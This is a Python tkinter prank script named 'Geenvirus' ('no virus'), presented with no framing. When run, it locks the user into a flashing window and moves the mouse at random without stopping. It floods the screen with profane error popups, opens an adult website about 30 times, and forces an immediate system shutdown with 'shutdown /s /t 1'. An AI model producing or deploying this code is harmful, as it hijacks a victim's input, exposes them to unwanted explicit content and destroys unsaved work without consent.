import tkinter
import tkinter as tk
import random
from tkinter import messagebox
import webbrowser
import pyautogui
import os

countervar = 10
timer = 0

window = tk.Tk()
window.title('Geenvirus')
window.geometry("2000x1000")
window.attributes('-disabled', True)
window.config(bg='grey')


Counter = tk.StringVar()
Counter.set(countervar)
Label = tkinter.Label(window, textvariable=Counter)
Label.place(relx=0.4,rely=0.3,width=200,height=150)


def telaf():
    global countervar
    countervar -= 1
    Counter.set(countervar)
    window.config(bg=random.choice([ "white", "black", "red", "green", "blue", "cyan", "yellow","magenta"]))


for i in range(10):
    timer += 1000
    window.after(timer, telaf)

muistimer = 0
def muiszetten():
    global muistimer
    muistimer += 1
    pyautogui.moveTo(random.randrange(400,800), random.randrange(400,800))
    window.after(muistimer, muiszetten)


window.after(1, muiszetten)

def error():
        window.config(bg=random.choice(["white", "black", "red", "green", "blue", "cyan", "yellow", "magenta"]))
        messagebox.showerror("Error", "Get fked")


timer2 = 10000
for i in range(50):
    timer2 += 50
    window.after(timer2, error)

def openenen():
    webbrowser.open('Pornhub.com', new=1)
    pyautogui.hotkey('win')

timer3 = 12500
for i in range(30):
    timer3 += 50
    window.after(timer3, openenen)


def afsluiten():
    print('test')
    os.system("shutdown /s /t 1")


window.after(14000, afsluiten)
window.mainloop()

